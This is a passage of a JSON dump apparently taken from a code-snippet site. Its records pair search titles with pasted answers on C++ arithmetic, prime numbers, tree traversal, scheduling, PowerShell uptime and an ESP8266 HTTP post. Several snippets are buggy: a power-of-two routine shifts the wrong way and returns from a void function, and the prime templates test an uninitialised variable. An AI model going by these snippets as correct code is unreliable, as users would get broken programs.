    "description": "#include <iostream> using namespace std;   int main() {     int arr[] = { 6, 3, 5, 2, 8 };     int n = sizeof(arr)/sizeof(arr[0]);       int elem = 2;       int i = 0;     while (i < n)     {         if (arr[i] == elem) {             break;         }         i++;     }       if (i < n)     {         cout << \"Element \" << elem << \" is present at index \" << i              << \" in the given array\";     }     else {         cout << \"Element is not present in the given array\";     }       return 0; }\n",
    "reg_date": "2021-10-12T11:42:35.000Z"
  },
  {
    "id": 3304,
    "keyword": null,
    "link": null,
    "title": " position of max element in vector c++",
    "description": "auto max = *max_element(vector.begin(), vector.end());\ncout<<*max_element(a.begin(), a.end())<<endl;\nint maxElementIndex = std::max_element(v.begin(),v.end()) - v.begin(); int maxElement = *std::max_element(v.begin(), v.end());  int minElementIndex = std::min_element(v.begin(),v.end()) - v.begin(); int minElement = *std::min_element(v.begin(), v.end());\nint main()  {      // Get the vector      vector<int> a = { 1, 45, 54, 71, 76, 12 };         // Print the vector      cout << \"Vector: \";      for (int i = 0; i < a.size(); i++)          cout << a[i] << \" \";      cout << endl;         // Find the max element      cout << \"\\nMax Element = \"          << *max_element(a.begin(), a.end());      return 0;  } \nint main(int argc, char** argv) {   int A[4] = {0, 2, 3, 1};   const int N = sizeof(A) / sizeof(int);    cout << \"Index of max element: \"        << distance(A, max_element(A, A + N))        << endl;    return 0; } \n",
    "reg_date": "2021-10-12T11:42:35.000Z"
  },
  {
    "id": 3305,
    "keyword": null,
    "link": null,
    "title": " post data with esp8266",
    "description": "/*  * HTTP Client POST Request  * Copyright (c) 2018, circuits4you.com  * All rights reserved.  * https://circuits4you.com   * Connects to WiFi HotSpot. */  #include <ESP8266WiFi.h> #include <WiFiClient.h>  #include <ESP8266WebServer.h> #include <ESP8266HTTPClient.h>  /* Set these to your desired credentials. */ const char *ssid = \"circuits4you.com\";  //ENTER YOUR WIFI SETTINGS const char *password = \"yourPassword\";  //Web/Server address to read/write from  const char *host = \"192.168.43.128\";   //https://circuits4you.com website or IP address of server  //======================================================================= //                    Power on setup //=======================================================================  void setup() {   delay(1000);   Serial.begin(115200);   WiFi.mode(WIFI_OFF);        //Prevents reconnection issue (taking too long to connect)   delay(1000);   WiFi.mode(WIFI_STA);        //This line hides the viewing of ESP as wifi hotspot      WiFi.begin(ssid, password);     //Connect to your WiFi router   Serial.println(\"\");    Serial.print(\"Connecting\");   // Wait for connection   while (WiFi.status() != WL_CONNECTED) {     delay(500);     Serial.print(\".\");   }    //If connection successful show IP address in serial monitor   Serial.println(\"\");   Serial.print(\"Connected to \");   Serial.println(ssid);   Serial.print(\"IP address: \");   Serial.println(WiFi.localIP());  //IP address assigned to your ESP }  //======================================================================= //                    Main Program Loop //======================================================================= void loop() {   HTTPClient http;    //Declare object of class HTTPClient    String ADCData, station, postData;   int adcvalue=analogRead(A0);  //Read Analog value of LDR   ADCData = String(adcvalue);   //String to interger conversion   station = \"A\";    //Post Data   postData = \"status=\" + ADCData + \"&station=\" + station ;      http.begin(\"http://192.168.43.128/c4yforum/postdemo.php\");              //Specify request destination   http.addHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");    //Specify content-type header    int httpCode = http.POST(postData);   //Send the request   String payload = http.getString();    //Get the response payload    Serial.println(httpCode);   //Print HTTP return code   Serial.println(payload);    //Print request response payload    http.end();  //Close connection      delay(5000);  //Post Data at every 5 seconds } //=======================================================================\n",
    "reg_date": "2021-10-12T11:42:35.000Z"
  },
  {
    "id": 3306,
    "keyword": null,
    "link": null,
    "title": " pow c++",
    "description": "#include <iostream> #include <cmath> using namespace std; int main () {   double base, exponent, result;\t\t   base = 3.4;\t   exponent = 4.4;\t   result = pow(base, exponent);\t\t   cout << base << \"^\" << exponent << \" = \" << result;\t\t   return 0; }\npow(base, exponent); //must #include <cmath> to use pow()  example:   #include <iostream> #include <cmath> //must include this library  int main () {   \tint y;  \tint x =10;    \ty = pow(x,2); // y = x^2 }\n#include <cmath> pow(base, exponent);\n#include<cmath> //header file for pow fun      pow(a,b)    // a^b   \nint base = 3; int power = 5; pow(double(base), double(power));\ntemplate<class T>T Pow(T n,T p)  {    T res = n;    for(T i = 1; i < p; i++)        res *= n;     return res;  } //Example: Pow(2,3) = 8\n",
    "reg_date": "2021-10-12T11:42:35.000Z"
  },
  {
    "id": 3307,
    "keyword": null,
    "link": null,
    "title": " pow in c++",
    "description": "#include <iostream> #include <cmath> using namespace std; int main () {   double base, exponent, result;\t\t   base = 3.4;\t   exponent = 4.4;\t   result = pow(base, exponent);\t\t   cout << base << \"^\" << exponent << \" = \" << result;\t\t   return 0; }\npow(base, exponent); //must #include <cmath> to use pow()  example:   #include <iostream> #include <cmath> //must include this library  int main () {   \tint y;  \tint x =10;    \ty = pow(x,2); // y = x^2 }\n#include<cmath> //header file for pow fun      pow(a,b)    // a^b   \n#include <cmath> pow(base, exponent);\nint base = 3; int power = 5; pow(double(base), double(power));\nThe function pow() is used to calculate the power raised  to the base value. It takes two arguments. It returns the power raised to the base value. It is declared in  &ldquo;math.h&rdquo; header file.\n",
    "reg_date": "2021-10-12T11:42:35.000Z"
  },
  {
    "id": 3308,
    "keyword": null,
    "link": null,
    "title": " pow in cpp header file",
    "description": "#include<cmath> //header file for pow fun      pow(a,b)    // a^b   \n",
    "reg_date": "2021-10-12T11:42:35.000Z"
  },
  {
    "id": 3309,
    "keyword": null,
    "link": null,
    "title": " pow without math.h",
    "description": "int pow(int base, int exp)     {       if(exp < 0)         return -1;          int result = 1;         while (exp)         {             if (exp & 1)                 result *= base;             exp >>= 1;             base *= base;         }          return result;     } \n",
    "reg_date": "2021-10-12T11:42:35.000Z"
  },
  {
    "id": 3310,
    "keyword": null,
    "link": null,
    "title": " power of two c++",
    "description": "bool IsPowerOfTwo(int x) {     return x && ((x & (x - 1)) == 0); }\n",
    "reg_date": "2021-10-12T11:42:35.000Z"
  },
  {
    "id": 3311,
    "keyword": null,
    "link": null,
    "title": " powers of 2 in cpp",
    "description": "// If not using any extra libraries // Powers of 2. If finding 2^n int main() {   int ans = 1 >> n; } // Suppose we want to find x ^ y void power(int x, int y) {   int ans = 1;   for (int i = 0; i < y; i++) {     ans *= x;   }   return ans; }\n",
    "reg_date": "2021-10-12T11:42:35.000Z"
  },
  {
    "id": 3312,
    "keyword": null,
    "link": null,
    "title": " powershell get uptime remote computer",
    "description": "(Get-Date) - (Get-CimInstance Win32_OperatingSystem -ComputerName Remote_Computer).LastBootupTime\n",
    "reg_date": "2021-10-12T11:42:35.000Z"
  },
  {
    "id": 3313,
    "keyword": null,
    "link": null,
    "title": " powershell script query mssql windows authentication",
    "description": "function global:SelectAllUsers() {     Read-Query -ConnectionString 'Server=localhost;Database=Ulysses;UID=EMEA\\XJ193;PWD=somepassword;Integrated Security=true;' `         -Query \"SELECT * FROM Users\" `         -Action {             echo \"I can take an action here\"         } }  function Read-Query {     param (         [Parameter(Mandatory=$true)]         [string]$ConnectionString,          [Parameter(Mandatory=$true)]         [string]$Query,          [Parameter(Mandatory=$true)]         [scriptblock]$Action     )      $SqlConnection = New-Object System.Data.SqlClient.SqlConnection     $SqlConnection.ConnectionString = $ConnectionString     $SqlConnection.Open()     $SqlCmd = New-Object System.Data.SqlClient.SqlCommand     $SqlCmd.CommandText = $Query     $SqlCmd.Connection = $SqlConnection     $reader = $SqlCmd.ExecuteReader()      while ($reader.Read())     {         $x = $null         $x = @{}          for ($i = 0; $i -lt $reader.FieldCount; ++$i)         {             $x.add($reader.GetName($i), $reader[$i])         }          Invoke-Command -ScriptBlock $action -ArgumentList $x     }      $SqlConnection.Close() }    SelectAllUsers \n",
    "reg_date": "2021-10-12T11:42:36.000Z"
  },
  {
    "id": 3314,
    "keyword": null,
    "link": null,
    "title": " powershell script to get uptime of multiple servers",
    "description": "Function Get-Uptime { <# .Synopsis     This will check how long the computer has been running and when was it last rebooted.     For updated help and examples refer to -Online version.     .NOTES     Name: Get-Uptime     Author: theSysadminChannel     Version: 1.0     DateCreated: 2018-Jun-16   .LINK     https://thesysadminchannel.com/get-uptime-last-reboot-status-multiple-computers-powershell/ -     .PARAMETER ComputerName     By default it will check the local computer.         .EXAMPLE     Get-Uptime -ComputerName PAC-DC01, PAC-WIN1001       Description:     Check the computers PAC-DC01 and PAC-WIN1001 and see how long the systems have been running for.   #>       [CmdletBinding()]     Param (         [Parameter(             ValueFromPipeline=$true,             ValueFromPipelineByPropertyName=$true,             Position=0)]           [string[]]             $ComputerName = $env:COMPUTERNAME     )       BEGIN {}       PROCESS {         Foreach ($Computer in $ComputerName) {             $Computer = $Computer.ToUpper()             Try {                 $OS = Get-WmiObject Win32_OperatingSystem -ComputerName $Computer -ErrorAction Stop                 $Uptime = (Get-Date) - $OS.ConvertToDateTime($OS.LastBootUpTime)                 [PSCustomObject]@{                     ComputerName  = $Computer                     LastBoot      = $OS.ConvertToDateTime($OS.LastBootUpTime)                     Uptime        = ([String]$Uptime.Days + \" Days \" + $Uptime.Hours + \" Hours \" + $Uptime.Minutes + \" Minutes\")                 }               } catch {                 [PSCustomObject]@{                     ComputerName  = $Computer                     LastBoot      = \"Unable to Connect\"                     Uptime        = $_.Exception.Message.Split('.')[0]                 }               } finally {                 $null = $OS                 $null = $Uptime             }         }     }       END {}   } \n",
    "reg_date": "2021-10-12T11:42:36.000Z"
  },
  {
    "id": 3315,
    "keyword": null,
    "link": null,
    "title": " pragma cpp",
    "description": "In computer programming, a directive or pragma is a language construct that specifies how a compiler should process its input. Directives are not part of the grammar of a programming language, and may vary from compiler to compiler. \n",
    "reg_date": "2021-10-12T11:42:36.000Z"
  },
  {
    "id": 3316,
    "keyword": null,
    "link": null,
    "title": " precision c++",
    "description": "fixed - it is used to forcefully follow precision zero. example: for 0.5 below code will print 0.500000  cout<<fixed<<setprecision(6)<<num<<endl;\nint x = 109887; cout << fixed << setprecision(3) << x;\n",
    "reg_date": "2021-10-12T11:42:36.000Z"
  },
  {
    "id": 3317,
    "keyword": null,
    "link": null,
    "title": " precision of fixed in c++",
    "description": "int x = 109887; cout << fixed << setprecision(3) << x;\n#include <iomanip>  // the rest of the code double a = 4.032; cout << fixed << setprecision(2); cout << a; // done; \n",
    "reg_date": "2021-10-12T11:42:36.000Z"
  },
  {
    "id": 3318,
    "keyword": null,
    "link": null,
    "title": " preemptive priority scheduling implementation in c",
    "description": "#include <iostream> #include <algorithm>  #include <iomanip> #include <string.h>  using namespace std;  struct process {     int pid;     int arrival_time;     int burst_time;     int priority;     int start_time;     int completion_time;     int turnaround_time;     int waiting_time;     int response_time; };  int main() {      int n;     struct process p[100];     float avg_turnaround_time;     float avg_waiting_time;     float avg_response_time;     float cpu_utilisation;     int total_turnaround_time = 0;     int total_waiting_time = 0;     int total_response_time = 0;     int total_idle_time = 0;     float throughput;     int burst_remaining[100];     int is_completed[100];     memset(is_completed,0,sizeof(is_completed));      cout << setprecision(2) << fixed;      cout<<\"Enter the number of processes: \";     cin>>n;      for(int i = 0; i < n; i++) {         cout<<\"Enter arrival time of process \"<<i+1<<\": \";         cin>>p[i].arrival_time;         cout<<\"Enter burst time of process \"<<i+1<<\": \";         cin>>p[i].burst_time;         cout<<\"Enter priority of the process \"<<i+1<<\": \";         cin>>p[i].priority;         p[i].pid = i+1;         burst_remaining[i] = p[i].burst_time;         cout<<endl;     }      int current_time = 0;     int completed = 0;     int prev = 0;      while(completed != n) {         int idx = -1;         int mx = -1;         for(int i = 0; i < n; i++) {             if(p[i].arrival_time <= current_time && is_completed[i] == 0) {                 if(p[i].priority > mx) {                     mx = p[i].priority;                     idx = i;                 }                 if(p[i].priority == mx) {                     if(p[i].arrival_time < p[idx].arrival_time) {                         mx = p[i].priority;                         idx = i;                     }                 }             }         }          if(idx != -1) {             if(burst_remaining[idx] == p[idx].burst_time) {                 p[idx].start_time = current_time;                 total_idle_time += p[idx].start_time - prev;             }             burst_remaining[idx] -= 1;             current_time++;             prev = current_time;                          if(burst_remaining[idx] == 0) {                 p[idx].completion_time = current_time;                 p[idx].turnaround_time = p[idx].completion_time - p[idx].arrival_time;                 p[idx].waiting_time = p[idx].turnaround_time - p[idx].burst_time;                 p[idx].response_time = p[idx].start_time - p[idx].arrival_time;                  total_turnaround_time += p[idx].turnaround_time;                 total_waiting_time += p[idx].waiting_time;                 total_response_time += p[idx].response_time;                  is_completed[idx] = 1;                 completed++;             }         }         else {              current_time++;         }       }      int min_arrival_time = 10000000;     int max_completion_time = -1;     for(int i = 0; i < n; i++) {         min_arrival_time = min(min_arrival_time,p[i].arrival_time);         max_completion_time = max(max_completion_time,p[i].completion_time);     }      avg_turnaround_time = (float) total_turnaround_time / n;     avg_waiting_time = (float) total_waiting_time / n;     avg_response_time = (float) total_response_time / n;     cpu_utilisation = ((max_completion_time - total_idle_time) / (float) max_completion_time )*100;     throughput = float(n) / (max_completion_time - min_arrival_time);      cout<<endl<<endl;      cout<<\"#P\\t\"<<\"AT\\t\"<<\"BT\\t\"<<\"PRI\\t\"<<\"ST\\t\"<<\"CT\\t\"<<\"TAT\\t\"<<\"WT\\t\"<<\"RT\\t\"<<\"\\n\"<<endl;      for(int i = 0; i < n; i++) {         cout<<p[i].pid<<\"\\t\"<<p[i].arrival_time<<\"\\t\"<<p[i].burst_time<<\"\\t\"<<p[i].priority<<\"\\t\"<<p[i].start_time<<\"\\t\"<<p[i].completion_time<<\"\\t\"<<p[i].turnaround_time<<\"\\t\"<<p[i].waiting_time<<\"\\t\"<<p[i].response_time<<\"\\t\"<<\"\\n\"<<endl;     }     cout<<\"Average Turnaround Time = \"<<avg_turnaround_time<<endl;     cout<<\"Average Waiting Time = \"<<avg_waiting_time<<endl;     cout<<\"Average Response Time = \"<<avg_response_time<<endl;     cout<<\"CPU Utilization = \"<<cpu_utilisation<<\"%\"<<endl;     cout<<\"Throughput = \"<<throughput<<\" process/unit time\"<<endl;   }  /*  AT - Arrival Time of the process BT - Burst time of the process ST - Start time of the process CT - Completion time of the process TAT - Turnaround time of the process WT - Waiting time of the process RT - Response time of the process  Formulas used:  TAT = CT - AT WT = TAT - BT RT = ST - AT  */  }  \n",
    "reg_date": "2021-10-12T11:42:36.000Z"
  },
  {
    "id": 3319,
    "keyword": null,
    "link": null,
    "title": " prefix and postfix operator overloading in c++",
    "description": "struct X {     // prefix increment     X& operator++()     {         // actual increment takes place here         return *this; // return new value by reference     }       // postfix increment     X operator++(int)     {         X old = *this; // copy old value         operator++();  // prefix increment         return old;    // return old value     }       // prefix decrement     X& operator--()     {         // actual decrement takes place here         return *this; // return new value by reference     }       // postfix decrement     X operator--(int)     {         X old = *this; // copy old value         operator--();  // prefix decrement         return old;    // return old value     } };\nclass Point { public: \tPoint& operator++() { ... }\t\t// prefix \tPoint operator++(int) { ... }\t// postfix   \tfriend Point& operator++(Point &p);\t\t\t// friend prefix   \tfriend Point operator++(Point &p, int);\t\t// friend postfix   \t// in Microsoft Docs written \"friend Point& operator++(Point &p, int);\" }; \n",
    "reg_date": "2021-10-12T11:42:36.000Z"
  },
  {
    "id": 3320,
    "keyword": null,
    "link": null,
    "title": " preorder",
    "description": "void preorder(Node* root){     if(root != NULL){         cout<<root->data<<\" \";         preorder(root->left);         preorder(root->right);     } }\n#include <iostream> using namespace std;  class node{ public:     int data;     node* left;     node* right;      node(int d){         data = d;         left = NULL;         right = NULL;     } };  node* buildTree(){     int d;     cin>>d;      if(d==-1){         return NULL;\t//to attach a NULL pointer[in case of no child] enter -1     }     node * root = new node(d);     root->left = buildTree();     root->right = buildTree();     return root; }    //REQUIRED FUNCTION: Inorder Traversal   void printIn(node*root){     if(root==NULL){         return;     }     //Otherwise Left Root Right     printIn(root->left);     cout<<root->data<<\" \";     printIn(root->right); }   int main(){      node* root = buildTree();     printIn(root);  \treturn 0; }  //SAMPLE INPUT TO RUN THE CODE ON ANY ONLINE IDE: //8 10 1 -1 -1 6 9 -1 -1 7 -1 -1 3 -1 14 13 -1 -1 -1 \n",
    "reg_date": "2021-10-12T11:42:36.000Z"
  },
  {
    "id": 3321,
    "keyword": null,
    "link": null,
    "title": " preorder to postorder",
    "description": "preorder: parent => left => right inorder: left => parent => right postorder: left => right => parent\nInput: N = 5 arr[]  = {40,30,35,80,100} Output: 35 30 100 80 40 Explanation: PreOrder: 40 30 35 80 100 InOrder: 30 35 40 80 100 Therefore, the BST will be:               40            /      \\          30       80            \\        \\               35      100 Hence, the postOrder traversal will be: 35 30 100 80 40\n",
    "reg_date": "2021-10-12T11:42:36.000Z"
  },
  {
    "id": 3322,
    "keyword": null,
    "link": null,
    "title": " preorder traversal c++",
    "description": "vector<int> v; void inorder(TreeNode* root,vector<int> &v) {   if(root==NULL)     return;   inorder(root->left,v);   v.push_back(root->val);   inorder(root->right,v); }\na s d \n#include <iostream> using namespace std;  class node{ public:     int data;     node* left;     node* right;      node(int d){         data = d;         left = NULL;         right = NULL;     } };  node* buildTree(){     int d;     cin>>d;      if(d==-1){         return NULL;\t//to attach a NULL pointer[in case of no child] enter -1     }     node * root = new node(d);     root->left = buildTree();     root->right = buildTree();     return root; }    //REQUIRED FUNCTION: Inorder Traversal   void printIn(node*root){     if(root==NULL){         return;     }     //Otherwise Left Root Right     printIn(root->left);     cout<<root->data<<\" \";     printIn(root->right); }   int main(){      node* root = buildTree();     printIn(root);  \treturn 0; }  //SAMPLE INPUT TO RUN THE CODE ON ANY ONLINE IDE: //8 10 1 -1 -1 6 9 -1 -1 7 -1 -1 3 -1 14 13 -1 -1 -1 \n",
    "reg_date": "2021-10-12T11:42:37.000Z"
  },
  {
    "id": 3323,
    "keyword": null,
    "link": null,
    "title": " prevent copy c++",
    "description": "Method 1: Private copy constructor and copy assignment operator   class Car { public:   Car(): owner() {}   void setOwner(Person *o) { owner = o; }   Person *getOwner() const { return owner; }   void info() const; private:   Car(const Car&);   Car& operator=(const Car&);   Person *owner; };  Method 2: Deleted copy constructor and copy assignment operator   class Car { public:   Car(const Car&) = delete;   void operator=(const Car&) = delete;   Car(): owner() {}   void setOwner(Person *o) { owner = o; }   Person *getOwner() const { return owner; } private:   Person *owner; };\n",
    "reg_date": "2021-10-12T11:42:37.000Z"
  },
  {
    "id": 3324,
    "keyword": null,
    "link": null,
    "title": " prevent getting data from data-tooltip-content tippyjs",
    "description": "tippy.setDefaults({       animation: 'scale',       animateFill: false,       maxWidth: 240,       duration: 0,       arrow: false,   });    tippy('.js-tippy-reviews', {       theme: 'reviews',       animation: 'scale',       animateFill: false,       maxWidth: 240,       duration: 0,       arrow: false,       onShow(instance) {         instance.popper.hidden = instance.reference.dataset.tippy ? false : true;       \tinstance.setContent(instance.reference.dataset.tippy);       }   });    $(document).ready(function(){   $(\"#btn-change-data\").click(function()   {     $(\".js-tippy-reviews\").attr(\"data-tippy\",$(\"#test-input\").val());   })  });\n",
    "reg_date": "2021-10-12T11:42:37.000Z"
  },
  {
    "id": 3325,
    "keyword": null,
    "link": null,
    "title": " previous greater element",
    "description": "//program in C++ to find previous greater element  //following approach is better than naive approach because it does very less no. //of comparisons between elements and skips unnecessary comparisons  #include <iostream> #include <stack> using namespace std;  void find_pge(int a[],int pge[],int n){     stack<int> s;     for(int i=n-1;i>=0;i--){       \t\t//if current element is greater than top of stack             while(!s.empty() && a[s.top()] < a[i]){                 pge[s.top()] = a[i];                 s.pop();             }             s.push(i);     }    //mark all remaining element's previous greater element to be -1(not present)     while(!s.empty()){         pge[s.top()] = -1;         s.pop();     } }  int main() { \tint a[5] = {5,4,3,4,5},pge[5]; \tfind_pge(a,pge,5); \tfor(int i=0;i<5;i++){ \t    cout<<\"previous greater element for \"<<a[i]<<\" is \"<<pge[i]<<\"\\n\"; \t} \treturn 0; }\n",
    "reg_date": "2021-10-12T11:42:37.000Z"
  },
  {
    "id": 3326,
    "keyword": null,
    "link": null,
    "title": " prime factorisation of a number in c++",
    "description": "// Function that returns a vector containing all the prime factors of n (25 --> 5, 5) vector<long long> prime_factorisation(long long n) {     //spf is smallest prime factor     map<long long, long long> spf;     vector<long long> ans(0);     for(long long i = 2; i <= n; i++) spf[i] = i;      for (long long i = 2; i <= n; i++)         if (spf[i] == i)             for (long long j = i * i; j <= n; j += i)                 if (spf[j] == j)                     spf[j] = i;      while (n != 1)     {         ans.push_back(spf[n]);         n /= spf[n];     }     return ans; }\n",
    "reg_date": "2021-10-12T11:42:37.000Z"
  },
  {
    "id": 3327,
    "keyword": null,
    "link": null,
    "title": " prime number",
    "description": "public class Prime {     public static void main(String[] args) {          int num = 29;         boolean flag = false;         for(int i = 2; i <= num/2; ++i){             if(num % i == 0){                 flag = true;                 break;             }         }          if (!flag)             System.out.println(num + \" is a prime number.\");         else             System.out.println(num + \" is not a prime number.\"); }}\nNumbers -- Prime Number Write a method that can check if a number is prime or not   Solution: public static boolean primeNumber(int num) {      if(num <= 1){         return false;     }      for(int i = 2; i < num; i++) {         if(num % i == 0) {             return false;         }     }      return true;  }\ndef is_prime(n):   if(n<0):     print(\"n is not a nature number!\")     return False   for i in range(1,ceil(n/2)+1):     if (i != n and i != 1 and n%i == 0):       return False   return True print(is_prime(int(input(\"number>>\"))))\na number that is divisible only by itself and 1 (e.g. 2, 3, 5, 7, 11) suppose a number 'n' it can be divided by if '1' and only by itself then it can be a prime number\n// PRIME NUMBER // 2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97.  let number = 5; if(number < 2){   console.log(\"less then 2 not prime\") } let flag = false; for(let i=2;i<number;i++){   if(number % i === 0){     flag = true;   } } if(flag){   console.log(\"Not prime \") } else{   console.log(\"Prime\") }  \n#include<bits/stdc++.h> using namespace std; bool Is_Prime(long long x){ \tif(x%2==0)return false; \tfor(int i=3;i*i<=x;i+=2) \t\tif(x%i==0)return false; \treturn true; } int main(){ \tlong long x; \tcin>>x; \tif(Is_Prime(x))cout<<\"Is Prime\"; \telse cout<<\"Is not Prime\"; }\n",
    "reg_date": "2021-10-12T11:42:37.000Z"
  },
  {
    "id": 3328,
    "keyword": null,
    "link": null,
    "title": " prime number c++",
    "description": "#include <iostream> using namespace std;  int main() {   int n, i;   bool isPrime = true;    cout << \"Enter a positive integer: \";   cin >> n;    for(i = 2; i <= n / 2; ++i)   {       if(n % i == 0)       {           isPrime = false;           break;       }   }   if (isPrime)       cout << \"This is a prime number\";   else       cout << \"This is not a prime number\";    return 0; }\n#include<bits/stdc++.h> using namespace std; bool Is_Prime(long long x){ \tif(x%2==0)return false; \tfor(int i=3;i*i<=x;i+=2) \t\tif(x%i==0)return false; \treturn true; } int main(){ \tlong long x; \tcin>>x; \tif(Is_Prime(x))cout<<\"Is Prime\"; \telse cout<<\"Is not Prime\"; }\ntemplate<class T> bool isPrime(T n)  {  \tT i;   \tif(i<2) return false; \tfor(i = 2; i * i <= n; i++) {      \tif(n % i == 0)  return false;      }  \treturn true;  }\n",
    "reg_date": "2021-10-12T11:42:37.000Z"
  },
  {
    "id": 3329,
    "keyword": null,
    "link": null,
    "title": " prime number generator c++",
    "description": "#include <vector> int main() {     std::vector<int> primes;     primes.push_back(2);     for(int i=3; i < 100; i++)     {         bool prime=true;         for(int j=0;j<primes.size() && primes[j]*primes[j] <= i;j++)         {             if(i % primes[j] == 0)             {                 prime=false;                 break;             }         }         if(prime)          {             primes.push_back(i);             cout << i << \" \";         }     }      return 0; } \n",
    "reg_date": "2021-10-12T11:42:37.000Z"
  },
  {
    "id": 3330,
    "keyword": null,
    "link": null,
    "title": " prime number in a range",
    "description": "class main{    public static void main(String [] args){       Scanner sc = new Scanner(System.in); // Scanner function should be imported//         int a = sc.nextInt();         int c = 0;          for(int i=2;i<=a;i++) {     \t           \t    \t for(int j=2;j<=i;j++) {                  if(i==j) {                         c++;     \t    \t   }                         \t         if(i%j==0) {       \t    \t   break;     \t    \t }       \t    \t }                  }     \t    System.out.println(\"\\nTotal prime numbers (\"+a+\") - \"+c);   } } \n//Prime Numbers & Sieve of Eratosthenes #include <iostream> #include<math.h>  using namespace std; int count_prime(int n) {     bool bo[n+1];     bo[0]=false;     bo[1]=false;     for(int i=2;i<=n;i++)     {         bo[i]=true;     }     int count=0;     for(int i=2;i<=sqrt(n);i++)     {         for(int j=2*i;j<=n;j=j+i)         {             bo[j]=false;         }     }     for(int i=2;i<=n;i++)     {         if(bo[i]==true)         {             count++;         }     }     return count; }  int main() {     ios_base::sync_with_stdio(false);     cin.tie(NULL);     int t;     cin>>t;     while(t--)     {         int n;         cin>>n;         int ans=count_prime(n);         cout<<ans<<endl;     }     return 0; } \n",
    "reg_date": "2021-10-12T11:42:37.000Z"
  },
  {
    "id": 3331,
    "keyword": null,
    "link": null,
    "title": " prime numbers less than a given number c++",
    "description": "// This Function returns a vector containing all primes less than n using seive of eratosthenes vector<long long> primes_less_than(long long n) {     vector<long long> ans(0);     if (n <= 2)         return ans;     map<long long, bool> is_prime;     for(long long i=0; i < n; i++)        \tis_prime[i] = true;     is_prime[0] = false;     is_prime[1] = false;      for (long long i = 2; i < sqrt(n); i++)         if (is_prime[i])             for (long long j = i * i; j < n; j += i)                 is_prime[j] = false;      for(long long i=0; i < n; i++)       \tif (is_prime[i] == true)            \tans.push_back(i);     return ans; }\n",
    "reg_date": "2021-10-12T11:42:38.000Z"
  },
  {
    "id": 3332,
    "keyword": null,
    "link": null,
    "title": " prime template c++",
    "description": "template<class T> bool isPrime(T n)  { \tT i; \tif(i < 2) return false; \tfor(i = 2; i * i <= n; i++) {     \tif(n % i == 0) return false;     return true; }\n",
    "reg_date": "2021-10-12T11:42:38.000Z"
  },
  {
    "id": 3333,
    "keyword": null,
    "link": null,
    "title": " primeros numeors primos menores que",
    "description": "#include<bits/stdc++.h> using namespace std; bool Is_Prime(long long x){ \tif(x%2==0)return false; \tfor(int i=3;i*i<=x;i+=2) \t\tif(x%i==0)return false; \treturn true; } int main(){ \t//primes less than n \tint n; \tcin>>n; \tint primes=0,i=1; \twhile(primes++<n){ \t\twhile(!Is_Prime(++i)); \t\tcout<<i<<\" \"; \t} }\n",
    "reg_date": "2021-10-12T11:42:38.000Z"
  },
  {
    "id": 3334,
    "keyword": null,
    "link": null,
    "title": " primeros numeros primos",
    "description": "#include<bits/stdc++.h> using namespace std; bool Is_Prime(long long x){ \tif(x%2==0)return false; \tfor(int i=3;i*i<=x;i+=2) \t\tif(x%i==0)return false; \treturn true; } int main(){ \t//first n prime numbers \tint n; \tcin>>n; \tint i=1; \twhile(n--){ \t\twhile(!Is_Prime(++i)); \t\tcout<<i<<\" \"; \t} }\n",
    "reg_date": "2021-10-12T11:42:38.000Z"
  },
  {
    "id": 3335,
    "keyword": null,
    "link": null,
    "title": " primes from 1 to n c++",
    "description": "#include<iostream>   using namespace std;     int main(){         int N, i, j, isPrime, n;       cout << \"Enter the value of N\\n\";     cin >> N;         // For every number between 2 to N, check      // whether it is prime number or not             for(i = 2; i <= N; i++){         isPrime = 0;         // Check whether i is prime or not         for(j = 2; j <= i/2; j++){              // Check If any number between 2 to i/2 divides I               // completely If yes the i cannot be prime number              if(i % j == 0){                  isPrime = 1;                  break;              }         }                     if(isPrime==0 && N!= 1)             cout << i << \" \";     }      return 0; } \n",
    "reg_date": "2021-10-12T11:42:38.000Z"
  },
  {
    "id": 3336,
    "keyword": null,
    "link": null,
    "title": " primitive and non primitive data types",
    "description": "Primitive data types are those data types which are used by programmers when creating variables in their program.  For example :-     * boolean     * char     * byte     * short     * int     * long     * float     * double Non-Primitive data types:     * String     * array     * enum     * class     * etc\nNon-Primitive Data Types: These data types are not actually defined by  the programming language but are created by the programmer. They are  also called &ldquo;reference variables&rdquo; or &ldquo;object references&rdquo; since they  refer to a memory location which stores the data.    All classes are non-primitive data types. Example : Object, String, Integer, Boolean, etc...\n",
    "reg_date": "2021-10-12T11:42:38.000Z"
  },
  {
    "id": 3337,
    "keyword": null,
    "link": null,
    "title": " primitive and non primitive data types in c++",
    "description": "Primitive data types are those data types which are used by programmers when creating variables in their program.  For example :-     * boolean     * char     * byte     * short     * int     * long     * float     * double Non-Primitive data types:     * String     * array     * enum     * class     * etc\n",
    "reg_date": "2021-10-12T11:42:38.000Z"
  },
  {
    "id": 3338,
    "keyword": null,
    "link": null,
    "title": " primitive and non primitive data types in java",
    "description": "Primitive data types are those data types which are used by programmers when creating variables in their program.  For example :-     * boolean     * char     * byte     * short     * int     * long     * float     * double Non-Primitive data types:     * String     * array     * enum     * class     * etc\n",
    "reg_date": "2021-10-12T11:42:38.000Z"
  },
  {
    "id": 3339,
    "keyword": null,
    "link": null,
    "title": " primos menores que",
    "description": "#include<bits/stdc++.h> using namespace std; bool Is_Prime(long long x){ \tif(x%2==0)return false; \tfor(int i=3;i*i<=x;i+=2) \t\tif(x%i==0)return false; \treturn true; } int main(){ \t//primes less than n \tint n; \tcin>>n; \tint primes=0,i=1; \twhile(primes++<n){ \t\twhile(!Is_Prime(++i)); \t\tcout<<i<<\" \"; \t} }\n",
    "reg_date": "2021-10-12T11:42:39.000Z"
  },
  {
    "id": 3340,
    "keyword": null,
    "link": null,
    "title": " prims algorithm",
